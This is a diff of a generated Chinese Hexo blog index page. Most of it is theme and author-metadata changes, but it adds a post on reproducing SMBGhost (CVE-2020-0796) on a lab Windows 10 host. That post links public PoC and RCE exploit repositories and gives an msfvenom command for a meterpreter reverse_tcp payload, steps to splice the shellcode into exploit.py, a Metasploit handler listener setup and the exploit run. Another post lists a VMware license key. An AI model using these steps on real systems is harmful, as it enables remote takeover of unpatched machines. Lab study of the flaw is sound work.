@@ -17,15 +17,17 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta property="og:type" content="website">
+  <meta name="description" content="一句话的长度">
+<meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一句话的长度">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:author" content="xnd">
+<meta property="article:author" content="kec的博客">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="http://example.com/">
@@ -113,11 +115,6 @@
     <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
-        <li class="menu-item menu-item-about">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
-
-  </li>
         <li class="menu-item menu-item-tags">
 
     <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
@@ -175,12 +172,109 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="kec的博客">
+      <meta itemprop="description" content="一句话的长度">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/07/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91%E6%BC%8F%E6%B4%9E%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/" class="post-title-link" itemprop="url">永恒之黑漏洞参考文档</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-07-11 20:12:57 / 修改时间：20:37:51" itemprop="dateCreated datePublished" datetime="2024-07-11T20:12:57+08:00">2024-07-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%8F%82%E8%80%83%E6%96%87%E6%A1%A3/" itemprop="url" rel="index"><span itemprop="name">参考文档</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>POC(蓝屏):漏洞证明</p>
+<blockquote>
+<p>下载<a target="_blank" rel="noopener" href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a><br>使用<br><code>pip install ntlm_auth</code></p>
+</blockquote>
+<p> .&#x2F;CVE-2020-0796.py  192.168.30.134</p>
+<p> EXP(RCE)：漏洞利用</p>
+<p>下载<a target="_blank" rel="noopener" href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a><br> 接下来使用kali作为攻击机</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.223.128  LPORT=5555 -b &#x27;\x00&#x27; -i 5 -f python &gt; exploit</span><br></pre></td></tr></table></figure>
+
+<p> 使用vim</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim exploit                     </span><br><span class="line">:%s/buf/USER_PAYLOAD             </span><br><span class="line">:wq!  </span><br></pre></td></tr></table></figure>
+<p> 去文件夹将exploit内容替换到exploit.py</p>
+<p> 参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_63610715/article/details/133847253">https://blog.csdn.net/weixin_63610715/article/details/133847253</a></p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set lhost 192.168.20.128</span><br><span class="line">set lport 5555</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">python exploit.py -ip 192.168.20.128（靶机ip)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><h2 id="一、复现环境"><a href="#一、复现环境" class="headerlink" title="一、复现环境"></a>一、复现环境</h2><p>靶机：windows10 1903 x64ip：192.168.1.6（关闭防火墙）<br>下载地址：<a target="_blank" rel="noopener" href="https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&appType=PC&videobtindex=-1&storid=c39vhtrekug5&share_from=dlpage_share_link">https://sl-m-ssl.xunlei.com/h5/page/download-share/index.html?entry=link&amp;appType=PC&amp;videobtindex=-1&amp;storid=c39vhtrekug5&amp;share_from=dlpage_share_link</a><br>攻击机：kali2019ip：192.168.1.10<br><img src="/../img/image.webp"><br><img src="/../img/image%201.webp"></p>
+<h2 id="二、检测工具："><a href="#二、检测工具：" class="headerlink" title="二、检测工具："></a>二、检测工具：</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>1.在靶机里下载检测工具：<a target="_blank" rel="noopener" href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip/</a></p>
+<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><p>2.运行工具，检测到漏洞风险<br><img src="/../img/image%202.webp"></p>
+<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>POC下载：</p>
+<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><ol>
+<li>在kali中利用MSF生成木马：</li>
+</ol>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.129 LPORT=5555 -b &#39;\x00&#39; -i 1 -f python &gt; exploit</code></p>
+<p>&#x2F;&#x2F; -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp 设置payload为windows64位meterpreter控制台下的反向连接<br>&#x2F;&#x2F; LPORT&#x3D;6666 设置开发端口为6666<br>&#x2F;&#x2F; -b ‘\x00’ 设置在生成的程序中避免出现’\x00’<br>&#x2F;&#x2F; -i 1 设置编码次数为一次<br>&#x2F;&#x2F; -f python 设置生成python格式文件</p>
+<h3 id="2-用生成的shellcode将POC文件里exploit-py中的一部分替换掉，直接复制粘贴，将buf替换成USER-PAYLOAD保存"><a href="#2-用生成的shellcode将POC文件里exploit-py中的一部分替换掉，直接复制粘贴，将buf替换成USER-PAYLOAD保存" class="headerlink" title="2.用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存"></a>2.用生成的shellcode将POC文件里exploit.py中的一部分替换掉，直接复制粘贴，将buf替换成USER_PAYLOAD保存</h3><p><img src="/../img/image%203.webp"></p>
+<h3 id="3-kali开启监听"><a href="#3-kali开启监听" class="headerlink" title="3. kali开启监听"></a>3. kali开启监听</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 192.168.20.128</span><br><span class="line">set lport 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-运行exp"><a href="#4-运行exp" class="headerlink" title="4. 运行exp"></a>4. 运行exp</h3><p><code>python3 exploit.py -ip 192.168.20.128</code><br><img src="/../img/image%204.webp"><br>如果失败，多试几十次，中间会蓝屏，等各种情况，属于正常行为</p>
+<h3 id="5-命令执行"><a href="#5-命令执行" class="headerlink" title="5. 命令执行"></a>5. 命令执行</h3><p><img src="/../img/image%205.webp"></p>
+<h3 id="6-简易原理图"><a href="#6-简易原理图" class="headerlink" title="6. 简易原理图"></a>6. 简易原理图</h3><p><img src="/../img/Pasted%20image%2020240711201750.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/11/%E5%9B%BE%E7%89%87%E6%B5%8B%E8%AF%953/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xnd">
-      <meta itemprop="description" content="">
+      <meta itemprop="name" content="kec的博客">
+      <meta itemprop="description" content="一句话的长度">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -200,7 +294,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2024-07-11 09:33:07 / 修改时间：13:21:50" itemprop="dateCreated datePublished" datetime="2024-07-11T09:33:07+08:00">2024-07-11</time>
+              <time title="创建时间：2024-07-11 09:33:07 / 修改时间：19:41:21" itemprop="dateCreated datePublished" datetime="2024-07-11T09:33:07+08:00">2024-07-11</time>
             </span>
 
           
@@ -259,73 +353,12 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/11/%E6%9C%AA%E5%91%BD%E5%90%8D%201/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xnd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/07/11/%E6%9C%AA%E5%91%BD%E5%90%8D%201/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-07-11 09:23:23 / 修改时间：09:37:56" itemprop="dateCreated datePublished" datetime="2024-07-11T09:23:23+08:00">2024-07-11</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <hr>
-<h2 id="title-图片测试"><a href="#title-图片测试" class="headerlink" title="title:图片测试"></a>title:图片测试</h2><p>![[..&#x2F;img&#x2F;Pasted image 20240711092343.png]]</p>
-<p><img src="/../img/Pasted%20image%2020240711093754.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/10/%E7%95%8C%E9%9D%A2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xnd">
-      <meta itemprop="description" content="">
+      <meta itemprop="name" content="kec的博客">
+      <meta itemprop="description" content="一句话的长度">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -343,10 +376,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-07-10 20:22:28 / 修改时间：20:28:50" itemprop="dateCreated datePublished" datetime="2024-07-10T20:22:28+08:00">2024-07-10</time>
+              <time title="创建时间：2024-07-10 20:22:28" itemprop="dateCreated datePublished" datetime="2024-07-10T20:22:28+08:00">2024-07-10</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-07-11 19:40:50" itemprop="dateModified" datetime="2024-07-11T19:40:50+08:00">2024-07-11</time>
+              </span>
 
           
 
@@ -359,7 +398,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>1<a target="_blank" rel="noopener" href="https://www.vmware.com/products/desktop-hypervisor.html">vmware17</a><br>2<a target="_blank" rel="noopener" href="https://public.xp.cn/upgrades/phpStudy_64.zip">phpstudy</a><br>3<a target="_blank" rel="noopener" href="https://download.oracle.com/java/22/latest/jdk-22_windows-x64_bin.msi">java22</a><br>4<a target="_blank" rel="noopener" href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83/python-3.9.2rc1-amd64.exe">python3.9</a><br>5<a target="_blank" rel="noopener" href="https://download-cdn.jetbrains.com/idea/ideaIU-2024.1.4.exe">IDEA</a><br>6<a target="_blank" rel="noopener" href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Navicat%20Premium%2012.zip">Navicat</a><br>7<a target="_blank" rel="noopener" href="https://vscode.download.prss.microsoft.com/dbazure/download/stable/ea1445cc7016315d0f5728f8e8b12a45dc0a7286/VSCodeUserSetup-x64-1.91.0.exe">vscode</a><br>8<a target="_blank" rel="noopener" href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Uninstall%20Tool.zip">Uninstall Tool(系统软件卸载工具)</a>不是必须的<br>9<a target="_blank" rel="noopener" href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Bandizip%20v7.23.zip">bandzip(解压软件)</a>不是必须的<br>10<a target="_blank" rel="noopener" href="https://www.voidtools.com/Everything-1.4.1.1024.x64-Setup.exe">everything(</a>全局文件搜索软件)不是必须的  </p>
+          <h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><p>1<a target="_blank" rel="noopener" href="https://www.vmware.com/products/desktop-hypervisor.html">vmware17</a><br>2<a target="_blank" rel="noopener" href="https://public.xp.cn/upgrades/phpStudy_64.zip">phpstudy</a><br>3<a target="_blank" rel="noopener" href="https://download.oracle.com/java/22/latest/jdk-22_windows-x64_bin.msi">java22</a><br>4<a target="_blank" rel="noopener" href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83/python-3.9.2rc1-amd64.exe">python3.9</a><br>5<a target="_blank" rel="noopener" href="https://download-cdn.jetbrains.com/idea/ideaIU-2024.1.4.exe">IDEA</a><br>6<a target="_blank" rel="noopener" href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Navicat%20Premium%2012.zip">Navicat</a><br>7<a target="_blank" rel="noopener" href="https://vscode.download.prss.microsoft.com/dbazure/download/stable/ea1445cc7016315d0f5728f8e8b12a45dc0a7286/VSCodeUserSetup-x64-1.91.0.exe">vscode</a><br>8<a target="_blank" rel="noopener" href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Uninstall%20Tool.zip">Uninstall Tool(系统软件卸载工具)</a>不是必须的<br>9<a target="_blank" rel="noopener" href="http://pan.sunwu.world:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Bandizip%20v7.23.zip">bandzip(解压软件)</a>不是必须的<br>10<a target="_blank" rel="noopener" href="https://www.voidtools.com/Everything-1.4.1.1024.x64-Setup.exe">everything(</a>全局文件搜索软件)不是必须的  </p>
 <h1 id="软件安装方法"><a href="#软件安装方法" class="headerlink" title="软件安装方法"></a>软件安装方法</h1><p><a target="_blank" rel="noopener" href="http://sunwu.world/2023/02/14/vmware17%e5%ae%89%e8%a3%85%e5%8f%8awin11%e5%ae%89%e8%a3%85/">vmware</a></p>
 <p>许可证: <code>JU090-6039P-08409-8J0QH-2YR7F</code>  </p>
 <p>phpstudy<br>建议安装路径不要修改，默认安装在D盘  </p>
@@ -419,12 +458,12 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/10/hello/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/10/index/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xnd">
-      <meta itemprop="description" content="">
+      <meta itemprop="name" content="kec的博客">
+      <meta itemprop="description" content="一句话的长度">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -433,7 +472,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2024/07/10/hello/" class="post-title-link" itemprop="url">[object Object]</a>
+            <a href="/2024/07/10/index/" class="post-title-link" itemprop="url">Hello World</a>
         </h2>
 
         <div class="post-meta">
@@ -442,91 +481,24 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2024-07-10 18:42:39 / 修改时间：20:28:24" itemprop="dateCreated datePublished" datetime="2024-07-10T18:42:39+08:00">2024-07-10</time>
+              <time title="创建时间：2024-07-10 16:14:58" itemprop="dateCreated datePublished" datetime="2024-07-10T16:14:58+08:00">2024-07-10</time>
             </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="hello-hexo"><a href="#hello-hexo" class="headerlink" title="hello hexo"></a>hello hexo</h1><table>
-<thead>
-<tr>
-<th>第一栏</th>
-<th>第二栏</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>第二栏</td>
-<td></td>
-</tr>
-<tr>
-<td>hello</td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td><img src="/../img/Pasted%20image%2020240710184550.png"></td>
-<td></td>
-</tr>
-</tbody></table>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/10/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xnd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/07/10/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-07-11 20:11:46" itemprop="dateModified" datetime="2024-07-11T20:11:46+08:00">2024-07-11</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
+                <i class="far fa-folder"></i>
               </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-07-10 16:14:58 / 修改时间：18:35:06" itemprop="dateCreated datePublished" datetime="2024-07-10T16:14:58+08:00">2024-07-10</time>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
+                </span>
             </span>
 
           
@@ -576,8 +548,8 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="xnd">
-      <meta itemprop="description" content="">
+      <meta itemprop="name" content="kec的博客">
+      <meta itemprop="description" content="一句话的长度">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -703,32 +675,46 @@
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">xnd</p>
-  <div class="site-description" itemprop="description"></div>
+    <img class="site-author-image" itemprop="image" alt="kec的博客"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">kec的博客</p>
+  <div class="site-description" itemprop="description">一句话的长度</div>
 </div>
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-count">5</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-        <span class="site-state-item-count">2</span>
-        <span class="site-state-item-name">分类</span>
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
 
 
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://1234567fang.github.io/" title="https:&#x2F;&#x2F;1234567fang.github.io&#x2F;" rel="noopener" target="_blank">友链</a>
+        </li>
+    </ul>
+  </div>
 
       </div>
 
@@ -753,9 +739,9 @@
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">xnd</span>
+  <span class="author" itemprop="copyrightHolder">kec的博客</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
         
@@ -781,7 +767,7 @@
 <script src="/js/motion.js"></script>
 
 
-<script src="/js/schemes/muse.js"></script>
+<script src="/js/schemes/pisces.js"></script>
 
 
 <script src="/js/next-boot.js"></script>
